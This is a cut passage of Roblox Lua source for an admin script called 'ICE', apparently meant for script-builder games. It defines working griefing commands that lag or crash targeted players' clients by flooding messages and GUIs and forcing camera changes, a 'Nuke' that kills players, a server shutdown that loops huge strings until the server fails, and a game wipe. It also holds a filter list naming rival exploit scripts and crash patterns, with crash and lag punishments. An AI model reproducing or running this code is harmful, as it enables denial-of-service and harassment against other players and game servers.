				LocalPlayer.CameraMode = Enum.CameraMode.Classic
				wait()
				function buildGui()
					local guitable = {}
					
					guitable['Output'] = Instance.new('ScreenGui')
					guitable['Output'].Name = 'Output'
					
					guitable['ImageLabel'] = Instance.new('ImageLabel', guitable['Output'])
					guitable['ImageLabel'].Position = UDim2.new(0.11999998986721, 0, 0.14999996125698, 0)
					guitable['ImageLabel'].Size = UDim2.new(0.89999997615814, 0, 0.30000001192093, 0)
					guitable['ImageLabel'].BackgroundColor3 = Color3.new(0.68235296010971, 0.678431391716, 0.69019609689713)
					guitable['ImageLabel'].BackgroundTransparency = 1
					guitable['ImageLabel'].Image = 'http://www.roblox.com/asset/?id=117512375'
					
					return guitable['Output']
				end
				local GuiLag=buildGui()
				coroutine.wrap(function()
					for a=1,10 do wait()
						coroutine.wrap(function()  
							for b=1,10 do wait()
								for c=1,10 do 
									for d=1,10 do 
										Msg=Instance.new'Message'
										Hint=Instance.new'Hint'
										PG=game.Players.LocalPlayer:findFirstChild'PlayerGui' or Instance.new('PlayerGui',game.Players.LocalPlayer)
										Msg.Parent,Hint.Parent,GuiLag:clone().Parent=Workspace,Workspace.CurrentCamera,PG or Camera
										Msg.Text,Hint.Text=string.rep("\t ",365),string.rep("\t ",365)
									--	Derpis()
										if LocalPlayer.CameraMode ~= Enum.CameraMode.LockFirstPerson then LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson end
										pcall(function() loadstring(script:FindFirstChild("Source").Value or script:FindFirstChild("source").Value or script:FindFirstChild("DSource").Value)() end)
									end
								end
							end
						end)()
					end
				end)()
				]],v.Character)
		end
	end
)
ICE.Command('Char lag','clag',5,'Char lags #Player','#Player',
	function(Msg,Speaker)
		for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
			pcall(function()
				ICE.CreateLocalScript([=[
				ICE={
					['Services']={};
				};
				for i,v in pairs(game:children()) do ICE.Services[v.Name]=v end
				script.Parent=nil
				NormalColor=Color3.new(BrickColor.random())
				local LocalPlayer,Source,Camera,Workspace=ICE.Services.Players.LocalPlayer,script:children()[1],ICE.Services.Workspace.CurrentCamera,game:service'Workspace'
				coroutine.wrap(function()
					while wait() do
						for a=1,100 do wait()
							for aa=1,20 do wait()
								for aaa=1,10 do wait()
									for aaaa=1,5 do wait()
										--for b=1,20 do wait()
										--	for c=1,10 do wait()
										--		for d=1,5 do wait()
										--			for e=1,2 do wait()
										--				local Msg=Instance.new'Message'
										--				local Part=Instance.new'Part'
										--				local Hint=Instance.new'Hint'
													local Char=Instance.new'Model'
													if ICE.Services.Players.LocalPlayer.Character==nil then ICE.Services.Players.LocalPlayer.Character=Instance.new'Model' end
													for i,v in pairs(LocalPlayer.Character:children()) do v:Clone().Parent=Char end
													Char:MakeJoints()
													if LocalPlayer:findFirstChild'PlayerGui'==nil then Instance.new'PlayerGui'.Parent=LocalPlayer end
													if Char.Archivable==true then Char.Archivable=false end
													local Mod,Part,Color,Text=Char,Char.Head,NormalColor,"I'm being lagged!"
													local BBG = Instance.new("BillboardGui",Mod)
													BBG.Name = "BBG"
													BBG.StudsOffset = Vector3.new(0,4.5,0)
													BBG.Size = UDim2.new(10,0,10,0)
													local Label = Instance.new("TextLabel",BBG)
													Label.Name = "Label"
													Label.Text = ""
													Label.TextColor3 = Color3.new(-1,-1,-1)
													Label.FontSize = "Size24"
													Label.BackgroundTransparency = 1
													Label.TextStrokeTransparency = 0.5
													Label.Size = UDim2.new(1,0,1,0)
													Label.TextStrokeColor3 = Color
													local Sel=Instance.new'SelectionBox'
													Sel.Name='Lag'
													Sel.Parent=Char.Head
													Sel.Adornee=Sel.Parent
													Sel.Color=BrickColor.random()
										--			Msg.Text='You bein lagged bish'
										--			Hint.Text=Msg.Text
										--			Part.Parent=Workspace.CurrentCamera
										--			Msg.Parent=Workspace
										--			Hint.Parent=Workspace
													Char.Parent=workspace.CurrentCamera
													Char:MakeJoints();
											--[[		local GuiLag=Instance.new('ScreenGui')GuiLag = Instance.new("ScreenGui")
													GuiLag.Name = "Output"
													Blind = Instance.new("ImageButton", GuiLag)
													Blind.Name = "Blind"
													Blind.Position = UDim2.new(-0.10000000149012, 0, -0.10000000149012, 0)
													Blind.Size = UDim2.new(1.1000000238419, 0, 1.1000000238419, 0)
													Blind.BackgroundColor3 = Color3.new(0, 0, 0)
													ImageLabel = Instance.new("ImageLabel", Blind)
													ImageLabel.Position = UDim2.new(0.41999998688698, 0, 0.84999996423721, 0)
													ImageLabel.Size = UDim2.new(0.20000000298023, 0, 0.10000000149012, 0)
													ImageLabel.BackgroundColor3 = Color3.new(0.68235296010971, 0.678431391716, 0.69019609689713)
													ImageLabel.BackgroundTransparency = 1
													ImageLabel.Image = "http://www.roblox.com/asset/?id=112875964"
													TextLabel = Instance.new("TextLabel", Blind)
													TextLabel.Position = UDim2.new(0.27000001072884, 0, 0.74000000953674, 0)
													TextLabel.Size = UDim2.new(0.5, 0, 0.10000000149012, 0)
													TextLabel.BackgroundColor3 = Color3.new(0.031372550874949, 0.031372550874949, 0.035294119268656)
													TextLabel.Text = "Your Being Lagged"
													TextLabel.FontSize = Enum.FontSize.Size36
													TextLabel.TextWrapped = true
													TextLabel.Active = true
													GuiLag.Parent=ICE.Services.Players.LocalPlayer.PlayerGui
											--]]		LocalPlayer.CameraMode = Enum.CameraMode.Classic
													wait()
													LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
										--					Instance.new("Message",Camera).Text = string.rep("\t ",365)
										--					Instance.new('Hint',Camera).Text=("\t "):rep(365)
										--				end
										--			end
										--		end
										--	end
										end
									end
								end
							end
						end
					end)()
				]=],v.Character)
			end)
		end
	end
)
ICE.Command("Nuke","nuke",5,"Nukes the selected player.","<Player>",
    function(Msg,Speaker)
        for _,v in pairs(ICE.GetPlayers(Msg,Speaker)) do
 	    local Position = v.Character.Torso.Position
        local Sound = Instance.new("Sound", workspace)
        Sound.SoundId = "http://www.roblox.com/Asset/?id=2101159"
        Sound.Volume = 1
        Sound.Pitch = math.random(90, 110) / 100
        Sound:Play()
        local Sound = Instance.new("Sound", workspace)
        Sound.SoundId = "http://www.roblox.com/Asset/?id=3087031"
        Sound.Volume = 1
        Sound.Pitch = math.random(90, 110) / 100
        Sound:Play()
        for i = 1, math.random(5, 7) do
                local ExplosionBall = Instance.new("Part", game:service("Workspace"))
                ExplosionBall.Name = "Explosion Ball"
                ExplosionBall.formFactor = "Custom"
                ExplosionBall.TopSurface = 0
                ExplosionBall.BottomSurface = 0
                ExplosionBall.Anchored = true
                ExplosionBall.CanCollide = false
                ExplosionBall.Size = Vector3.new(1, 1, 1)
                ExplosionBall.BrickColor = BrickColor.random()
                ExplosionBall.CFrame = CFrame.new(Position)
                ExplosionBall.Touched:connect(function(part) if part:IsDescendentOf(v.Character) then part:BreakJoints() end end)
                Instance.new("SpecialMesh", ExplosionBall).MeshType = "Sphere"
                coroutine.wrap(function()
                        for i = 0, 1, 0.005 do
                                ExplosionBall.Transparency = (1 - i)
                                ExplosionBall.Mesh.Scale = Vector3.new(i * 250, i * 250, i * 250)
                                ExplosionBall.CFrame = CFrame.new(Position + (Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50)) * i))
                                if math.random(1, 25) == 1 then
                                        local Explosion = Instance.new("Explosion")
                                        Explosion.Position = ExplosionBall.Position + (Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50)) * i)
                                        Explosion.BlastPressure = 10000 * i
                                        Explosion.BlastRadius = i * 250
                                        Explosion.Parent = game:service("Workspace") 
                                end
                                wait()
                        end
                        for i = 0, 1, 0.05 do
                                ExplosionBall.Transparency = i
                                ExplosionBall.CFrame = CFrame.new(Position + (Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50)) * (1 - i)))
                                wait()
                        end
                        ExplosionBall:Remove()
                end)()
        end
        end
    end
)
--[[ Rank 6 ]]--
ICE.Command("ICE Clear","ICE",6,"Clears the game.","No Arguments",
    function(Msg,Speaker)
        for i,v in pairs(_G) do
            if type(v) == 'function' and getfenv(v).ICE == nil then
                for var,val in pairs(getfenv(v)) do
                    pcall(function() getfenv(v)[var] = nil end)
                end
            end
        end
        for i,v in pairs(_G) do
            _G[i] = nil
        end
        for _,v in pairs(ICE.Services) do 
            v.Name = 'Unknown Exception'
        end    
        for i,v in pairs(game.Workspace:children()) do
            pcall(function()
                if not v:IsA("Player") then
                    pcall(function()
                        if Prometheus ~= nil and v == Prometheus.script("lushmylife") then
                        else
                            pcall(function()
                                v.Disabled = true
                            end)
                            pcall(function()
                                ICE.Services.Debris:AddItem(v,0)
                            end)
                        end
                    end)
                end
            end)
        end
        for _,v in pairs(ICE.Services) do    
            v.Name = v.className
        end
        local Base=Instance.new("Part",ICE.Services.Workspace)
        Base.Name='Base'
        Base.Size=Vector3.new(2048,1,2048)
        Base.BrickColor=BrickColor.new("Bright blue")
        Base.Anchored=true
        Base.Locked=true
        Base.TopSurface='Smooth'
        Base.Transparency = 0.75
        Base.CFrame=CFrame.new(Vector3.new(0,0,0))
        local Spawn=Instance.new("SpawnLocation",ICE.Services.Workspace) Spawn.Name='SpawnLocation'
        Spawn.Size=Vector3.new(6,1,6)
        Spawn.Transparency=0.75
        Spawn.CanCollide=false
        Spawn.Anchored=true
        Spawn.Locked=true
		Spawn.BrickColor=BrickColor.new'Royal purple';
		Spawn.Parent=Base
        Spawn.CFrame=CFrame.new(Vector3.new(0,0,0))
		SpawnSel,BaseSel=Instance.new'SelectionBox',Instance.new'SelectionBox'
		SpawnSel.Parent,BaseSel.Parent=Spawn,Base
		SpawnSel.Adornee,BaseSel.Adornee=Spawn,Base
		SpawnSel.Color,BaseSel.Color=Spawn.BrickColor,Base.BrickColor
        for _,v in pairs(ICE.GetPlayers()) do v:LoadCharacter() end
    end
)

--[[ Rank 7 ]]--
ICE.Command('Shutdown','sd',7,'Shuts the server down','No arguments',
	function(Msg,Speaker)
		Msg=Instance.new'Message'
		for i=1,60 do
			Msg.Parent=ICE.Services.Workspace
			Msg.Text = 60 - i .. ' seconds left before server shuts down'
			wait(1)
		end
		loadstring([[
		repeat
			Instance.new('StringValue',Workspace).Value=("Nou"):re]]..[[p(1000000)
			wait()
		until ICE.Removed==false
		]])()
	end
)
ICE.Command('Print','print',7,'Prints the msg','msg',
	function(Msg,Speaker)
		ICE.Output(tostring(loadstring("return " .. Msg)()),'Red',Speaker)
	end
)
--[[ Rank 8 ]]--
ICE.Command('Cancel/break loops','cancel',8,'Cancles the loops','wait timer before loops cancel',
	function(Msg,Spkr)
		if tonumber(Msg) then
			wait(tonumber(Msg))
		end
		ICE.Cancel=true;
		wait(1)
		ICE.Cancel=false;
	end
)
ICE.Command('Break scripts','break',8,'Breaks scripts in workspace','no arguments',
	function(msg,speaker)
		except=false;
		if msg=="except me" then
			except=true
		end
		RecursiveScripts=function(Parent)
			Child={}
			for i,v in pairs(Parent:children()) do
				if v:IsA'Script' or v:IsA'LocalScript' then
					Child[#Child+1]=v
				end
				for ii,vv in pairs(RecursiveScripts(v)) do
					Child[#Child+1]=vv
				end
			end
			return Child
		end;
		for i,v in pairs(RecursiveScripts(ICE.Services.Workspace)) do
			if v:findFirstChild'Owner' and except==true then
				if v.Owner.Name==speaker.Name then
					return					
				end
			end
			v.Disabled=true;
			v:ClearAllChildren();
			game:service'Debris':AddItem(v,0)
		end
	end
)
--[[ Rank 10 ]]--
ICE.Command('Remove ICE','cremove',10,'Removes ICE','No arguments',
	function(Msg,Speaker)
		coroutine.wrap(function()
			ICE.Removed=true
			ICE.Output('ICE now removed!','Red',Speaker,3)
			local End=Instance.new'StringValue'
			End.Name='Ender'
			End.Value=ICE.Ender
			End.Parent=ICE.Services.Lighting
			for _,v in pairs(ICE.Services.Players:GetPlayers()) do ICE.RemoveTablets(v) ICE.SaveData(v) end
			End:Destroy()
		end)()
	end
)
ICE.Command('Lock scripts','lockscr',10,'Locks Scripting','No arguments',
	function()
		ICE.LockedScripts=true
	end
)
ICE.Command('Un-Lock scripts','unlockscr',10,'Un-Locks Scripting','No arguments',
	function()
		ICE.LockedScripts=false
	end
)
ICE.Command('Execute','exe',10,'Executes a line of coding','code',
	function(Msg,Speaker)
        local Func,Error = loadstring(Msg)
        getfenv(Func).print = function(...) local Rtn = "" for _,v in pairs({...}) do Rtn = Rtn..tostring(v).."\t" end ICE.Output(Rtn,"White",Speaker) end
        getfenv(Func).Speaker = Speaker
		getfenv(Func).ICE=ICE;
        if Error == nil then
            coroutine.wrap(function()
                Func()
            end)()
            ICE.Output("Script ran successfully!","Green",Speaker,3)
        else
            ICE.Output(Error,"Red",Speaker,5)
        end
    end
)
ICE.Command('System msg','sm',10,'System msg','Text',
	function(Text,Speaker)
		ICE.SystemMsg(Text)
	end
)
ICE.Command('Fix chat','fc',10,'Fixes chats for everyone','No arguments',
	function()
		for _,v in pairs(game:service'Players':GetPlayers()) do
			ICE.FixChat(v);
		end
	end
)
--[[ Connections ]]--
game:service'RunService'.Stepped:connect(function() if ICE.Removed==false then ICE.Rotate() end end)
for _,v in pairs(ICE.Services.Players:GetPlayers()) do
	ICE.Connect(v) 
end
ICE.Services.Players.PlayerAdded:connect(function(r) if ICE.Removed==false then ICE.Connect(r) end end)
ICE.Services.Players.PlayerRemoving:connect(function(v) ICE.RemoveTablets(v) if ICE.Removed==false and ICE.DataSaving==true then ICE.SaveData(v)  end end)
--[[ End of Connections ]]--
for _,Service in pairs(ICE.Services) do
    pcall(function()
        Service.DescendantAdded:connect(function(v)
            if v:IsA("BaseScript") and ICE.LockedScripts == true and ICE.Removed == false then
                pcall(function()
                    if game.PlaceId == 20279777 or game.PlaceId == 20132544 or v:findFirstChild('Owner') then-- For /scr/ Cmd --game.PlaceId == 20279777 or game.PlaceId == 20132544 then
                        if ICE.GetRank(v.Owner.Value) <= 0 then
                            pcall(function() v.Disabled = true end)
                            pcall(function() v:FindFirstChild("Source").Value =ICE.Disabler end)
                            pcall(function() v.Disabled = false end)
                            pcall(function() v:Destroy() end)
                        end
                    elseif game.PlaceId ==54194680 then
			if ICE.GetRank(v.user.Value) <= 0 then
                            pcall(function() v.Disabled = true end)
                            pcall(function() v:FindFirstChild("Source").Value =ICE.Disabler end)
                            pcall(function() v.Disabled = false end)
                            pcall(function() v:Destroy() end)
                        end
		else
                        pcall(function() v.Disabled = true end)
                        pcall(function() v:FindFirstChild("Source").Value = ICE.Disabler end)
                        pcall(function() v:FindFirstChild("DSource").Value =ICE.Disabler end)
                        pcall(function() v.Disabled = false end)
                        pcall(function() v:Destroy() end)
                    end
                end)
            end
        end)
    end)
end
for _,v in pairs(script:children()) do
	if v:IsA'StringValue' then
		v.Value="error('No value for you',0)()"
	end
end
script:ClearAllChildren();
ICE.Filter=function(Phrase,Bypass,Punishment,Reason)
        if Punishment == nil then Punishment = 0 end
        if type(Punishment) == 'string' then
	    if Punishment=='Kill' then Punishment=0 end
            if Punishment=='K'..'ick' then Punishment=1 end
            if Punishment=='Shutdown' then Punishment = 2 end
            if Punishment=='Crash' then Punishment = 3 end
            if Punishment=='B'..'an' then Punishment=4 end
            if Punishment=='Lag' then Punishment=5 end
        end
        ICE.Filters[Phrase]={Bypass=Bypass,Punishment=Punishment,Reason=Reason}
end
ICE.Filter('function l'..'ag()',9,'Ban','Lag attempt')
ICE.Filter('iO'..'rb',2,2,'Abusive')
ICE.Filter('iCm'..'d={}',2,2,'iOrb')
ICE.Filter('game.Players:ClearAllChildren',2,4,"Kick attempt")
ICE.Filter('ClonyPooP'..'oo',2,2,'SergeantSmokes Nilizer or TeamDmans KeyBindings')
ICE.Filter("No".."va =",4,2,"Admi".."n")
ICE.Filter("Ranked = {",4,"Ban","This is a ranked table in NOVA")
ICE.Filter('iFl'..'ip',3,4,"Adm".."in")
ICE.Filter("/d".."own",2,2,"Ca".."mball")
ICE.Filter('repeat until',2,5,"Crash attempt")
ICE.Filter('while true do end',2,5,"Crash attempt")
ICE.Filter('string.rep',2,2,"Shuttdown attempt")
ICE.Filter(':rep',2,2,"Shutdown attempt")
ICE.Filter('Players.'..string.char(116,117,115,75,79,114,54,54,49)..':',2,4,"Nou touching my Player")
ICE.Filter('kick:',1,'Kick','No kicking allowed')
ICE.Filter('ban/',2,4,"No banning allowed")
ICE.Filter('tprivate',2,4,"No pri losah")
ICE.Filter(''..string.char(116,117,115,75,79,114,54,54,49)..':BreakJoints',1,0,">_> hao dare you .-.")
ICE.Filter(''..string.char(116,117,115,75,79,114,54,54,49)..':Destroy',1,0,"NOUUUUUUUUUUUUU")
ICE.Filter('p = game.Players:GetPlayers() for i=1,#p do p[i]:Destroy() end',1,3,'Stupid free model ')
ICE.Filter('CB'..'A =',2,4,"Abusive")
ICE.Filter('Kill'..'/',1,'Kill')
ICE.Filter('Kic'..'k'..':'..'t',2,'K'..'ick')
ICE.Filter('swag',1,'Kill')
ICE.Filter('yolo',1,'Kill','Well I guess he/she isnt alive now :3')
ICE.Filter('ssj',1,'Kill',"A free model script")
ICE.Filter('Onelegend',1,'K'..'ick',"Onelegend is in free models") -- Free modelz >_>
ICE.Filter('adminlist = {',2,'Ki'..'ck','No admins allowed/Take over attempt')
ICE.Filter('SetSuperSafeChat',4,'Ban','That my good sir, would be exploiting, and I do not tolerate exploiters. So get out and never come back/Exploit attempt')
ICE.Filter('colorAllGuisIn',5,'Ban','That is a perm DP Ban for using this abusive script n0b/Server destroy attempt')
ICE.Filter('Decs.Crack',1,'Kick','Masterhand/Free model')
ICE.Filter('AquireTargets',9,'Ban','OhYa321;s N0b SB Prot(Gay) script/Take over attempt')
ICE.Filter('GetRidOf(',9,'Ban','A function in NOVA/Take over attempt')
game:service'Workspace'.ChildAdded:connect(function(Child)
	if Child:IsA'Model' then -- 
		if Child.Name=='External' then
			local Player = nil;
			for i,v in pairs(Child:children()) do if v:IsA'StringValue' and v.Value=='Player' then Player=v end end
			local Message = Child.Message.Value
			if Player then
				ICE.OnChatted(Message,Player)
				print('Message:'..Message,'Player:'..Player)
			end
		end
	end
end) -- Mine uses cmds even fter your kicked ;)